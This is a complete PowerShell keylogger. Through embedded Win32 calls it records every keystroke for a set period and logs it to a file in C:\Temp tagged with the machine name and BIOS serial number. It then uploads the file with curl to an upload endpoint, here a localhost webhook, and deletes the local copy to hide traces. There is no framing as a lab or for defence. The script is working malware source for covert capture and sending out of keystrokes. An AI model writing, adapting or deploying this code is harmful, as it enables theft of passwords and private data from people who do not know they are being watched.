Add-Type @"
using System;
using System.Runtime.InteropServices;
using System.Text;

public class Win32API {
    [DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
    public static extern short GetAsyncKeyState(int virtualKeyCode);

    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int GetKeyboardState(byte[] Keystate);

    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, StringBuilder pwszBuff, int cchBuff, uint wFlags);
}
"@

$hidden = 'y'
$seconds = $seconds -as [int]
if (-not $seconds) {
    $seconds = 15
}
function Get-KeyboardState {
    $keystate = New-Object byte[] 256
    [Win32API]::GetKeyboardState($keystate) | Out-Null
    return $keystate
}

$device_id = "$($env:COMPUTERNAME)_$((Get-WmiObject Win32_BIOS).SerialNumber)"
$timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
$filename = "${device_id}_${timestamp}_keylog.txt"
$filepath = "C:\Temp\$filename"

$pressedKeys = @{}


$keyNames = @{
    0x08="[BACKSPACE]";0x09="[TAB]";0x0D="[ENTER]";0x10="[SHIFT]";0x11="[CTRL]";0x12="[ALT]"
    0x14="[CAPSLOCK]";0x1B="[ESC]";0x20="[SPACE]";0x21="[PAGE UP]";0x22="[PAGE DOWN]"
    0x23="[END]";0x24="[HOME]";0x25="[LEFT ARROW]";0x26="[UP ARROW]";0x27="[RIGHT ARROW]"
    0x28="[DOWN ARROW]";0x2C="[PRINT SCREEN]";0x2D="[INSERT]";0x2E="[DELETE]";0x5B="[LEFT WIN]"
    0x5C="[RIGHT WIN]";0x5D="[APPS]";0x70="[F1]";0x71="[F2]";0x72="[F3]";0x73="[F4]"
    0x74="[F5]";0x75="[F6]";0x76="[F7]";0x77="[F8]";0x78="[F9]";0x79="[F10]";0x7A="[F11]"
    0x7B="[F12]";0x90="[NUMLOCK]";0x91="[SCROLLLOCK]";0xA0="[LSHIFT]";0xA1="[RSHIFT]"
    0xA2="[LCTRL]";0xA3="[RCTRL]";0xA4="[LALT]";0xA5="[RALT]"
}

# run for X seconds

$start = Get-Date
while ((Get-Date) - $start -lt [TimeSpan]::FromSeconds($seconds)) {
    Start-Sleep -Milliseconds 50
    $keystate = Get-KeyboardState
    for ($vk = 8; $vk -le 255; $vk++) {
        $isDown = ([Win32API]::GetAsyncKeyState($vk) -band 0x8000) -ne 0

        # Suppress generic SHIFT/CTRL/ALT if either specific key is currently down
        if ($isDown) {
            if (
                ($vk -eq 0x10 -and (
                    ([Win32API]::GetAsyncKeyState(0xA0) -band 0x8000) -ne 0 -or
                    ([Win32API]::GetAsyncKeyState(0xA1) -band 0x8000) -ne 0
                )) -or
                ($vk -eq 0x11 -and (
                    ([Win32API]::GetAsyncKeyState(0xA2) -band 0x8000) -ne 0 -or
                    ([Win32API]::GetAsyncKeyState(0xA3) -band 0x8000) -ne 0
                )) -or
                ($vk -eq 0x12 -and (
                    ([Win32API]::GetAsyncKeyState(0xA4) -band 0x8000) -ne 0 -or
                    ([Win32API]::GetAsyncKeyState(0xA5) -band 0x8000) -ne 0
                ))
            ) {
                continue
            }
        }

        if ($isDown -and -not $pressedKeys.ContainsKey($vk)) {
            $pressedKeys[$vk] = $true
            if ($keyNames.ContainsKey($vk)) {
                "Key pressed: $($keyNames[$vk])" | Add-Content -Path "C:\Temp\$filename"
            } else {
                $sb = New-Object System.Text.StringBuilder 2
                $result = [Win32API]::ToUnicode([uint32]$vk, 0, $keystate, $sb, $sb.Capacity, 0)
                if ($result -gt 0) {
                    "Key pressed: $($sb.ToString())" | Add-Content -Path "C:\Temp\$filename"
                }
            }
        } elseif (-not $isDown -and $pressedKeys.ContainsKey($vk)) {
            $pressedKeys.Remove($vk)
        }
    }
}




$webhookurl = "http://127.0.0.1:5000/upload_keylog"
curl.exe -s -F "device_id=$device_id" -F "file1=@$filepath;filename=$filename" $webhookurl | Out-Null


# Cleanup
Remove-item ($filepath) -Force
